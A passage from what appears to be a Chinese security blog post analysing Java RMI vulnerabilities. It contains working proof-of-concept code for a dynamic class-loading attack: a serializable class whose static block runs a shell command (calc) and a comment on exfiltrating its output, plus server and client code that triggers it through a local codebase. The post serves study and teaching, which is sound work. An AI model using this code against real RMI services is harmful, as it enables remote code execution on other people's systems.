<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//这里由于在static代码块中，无法直接抛异常外带数据，不过有其他方式外带数据，可以自己查找下。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            sb += lineStr + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloObject</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line">        <span class="comment">// JDK 6u45、7u21之后，需要设置useCodebaseOnly</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        <span class="comment">// 配置policy文件以允许从远程加载类库</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>,<span class="string">&quot;D://java.policy&quot;</span>);</span><br><span class="line">        <span class="comment">// 开启RMISecurityManager</span></span><br><span class="line">        <span class="type">RMISecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        <span class="comment">// 设置codebase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectImpl</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulnFunc</span><span class="params">(HelloObject helloObject)</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloObject</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">extends</span> <span class="title class_">HelloObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        <span class="type">ExportObject</span> <span class="variable">exportObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExportObject</span>();</span><br><span class="line">        stub.vulnFunc(exportObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先运行HTTPServer启动代码，起一个codebase，然后运行Server端启动代码，再运行Client端启动代码<br>成功执行HTTPServer的恶意参数子类的静态代码块。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1695173375232-078b872d-2b1a-4173-8db1-bc1aea7d36f3.png#averageHue=%23429449&clientId=u7cc6a79c-6869-4&from=paste&height=850&id=u430417e8&originHeight=1063&originWidth=2539&originalType=binary&ratio=2&rotation=0&showTitle=false&size=197421&status=done&style=none&taskId=uda70261c-bcac-410c-88d0-64d72968d81&title=&width=2031.2" alt="image.png"></p>
<h1 id="JEP290-绕过"><a href="#JEP290-绕过" class="headerlink" title="JEP290 绕过"></a>JEP290 绕过</h1><p><strong>TODO</strong></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>源码分析<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1L3411a7ax">https://www.bilibili.com/video/BV1L3411a7ax</a><br><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack">https://su18.org/post/rmi-attack</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1530/">https://tttang.com/archive/1530/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a></p>
<p>攻击面<br><a target="_blank" rel="noopener" href="https://paper.seebug.org/1091">https://paper.seebug.org/1091</a><br><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack">https://su18.org/post/rmi-attack</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/520">https://goodapple.top/archives/520</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/321">https://goodapple.top/archives/321</a><br><a target="_blank" rel="noopener" href="https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8">https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/257452">https://www.anquanke.com/post/id/257452</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7930">https://xz.aliyun.com/t/7930</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/blog/">Home</a></li>
        
          <li><a href="/blog/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
        
          <li><a href="/blog/links/">links</a></li>
        
          <li><a href="/blog/about/">About</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%9B%BE%E8%83%9C%E5%8D%83%E8%A8%80"><span class="toc-number">2.1.</span> <span class="toc-text">一图胜千言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%9B%E5%BB%BA%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">2.2.</span> <span class="toc-text">服务端创建注册中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.3.</span> <span class="toc-text">服务端创建远程对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%BB%91%E5%AE%9A%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">2.4.</span> <span class="toc-text">服务端远程对象绑定注册中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%8E%A5%E5%8F%97%E5%B9%B6%E5%A4%84%E7%90%86%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%BB%91%E5%AE%9A%E8%AF%B7%E6%B1%82"><span class="toc-number">2.5.</span> <span class="toc-text">注册中心接受并处理服务端绑定请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.6.</span> <span class="toc-text">客户端获取注册中心代理对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%BB%A3%E7%90%86%E6%9F%A5%E6%89%BE%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.7.</span> <span class="toc-text">客户端通过注册中心代理查找远程对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%B6%E5%88%B0%E6%9F%A5%E8%AF%A2%E8%AF%B7%E6%B1%82%E5%B9%B6%E8%BF%94%E5%9B%9E%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BB%A3%E7%90%86"><span class="toc-number">2.8.</span> <span class="toc-text">注册中心收到查询请求并返回远程对象的代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%B0%83%E7%94%A8%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B9%E6%B3%95%E5%B9%B6%E8%8E%B7%E5%8F%96%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C"><span class="toc-number">2.9.</span> <span class="toc-text">客户端调用远程对象的方法并获取返回结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8E%A5%E6%94%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%B7%E6%B1%82%E5%B9%B6%E8%BF%94%E5%9B%9E%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">2.10.</span> <span class="toc-text">服务端接收调用函数请求并返回执行结果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">3.</span> <span class="toc-text">RMI的攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">3.1.</span> <span class="toc-text">客户端攻击服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">3.2.</span> <span class="toc-text">服务端攻击客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">3.3.</span> <span class="toc-text">客户端攻击注册中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">3.4.</span> <span class="toc-text">服务端攻击注册中心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7-%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">3.5.</span> <span class="toc-text">注册中心攻击客户&#x2F;服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.6.</span> <span class="toc-text">动态类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBClient%E7%AB%AF"><span class="toc-number">3.6.1.</span> <span class="toc-text">攻击Client端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBServer%E7%AB%AF"><span class="toc-number">3.6.2.</span> <span class="toc-text">攻击Server端</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JEP290-%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">JEP290 绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=RMI漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=RMI漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RMI漏洞分析&body=Check out this article: https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=RMI漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=RMI漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sketchpl4ne.github.io/blog/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=RMI漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    Jasper_sec
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/blog/">Home</a></li><!--
     --><!--
       --><li><a href="/blog/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
     --><!--
       --><li><a href="/blog/links/">links</a></li><!--
     --><!--
       --><li><a href="/blog/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/blog/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?99ca4f1abdfd4d3c5c82d59c3565c6f2";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
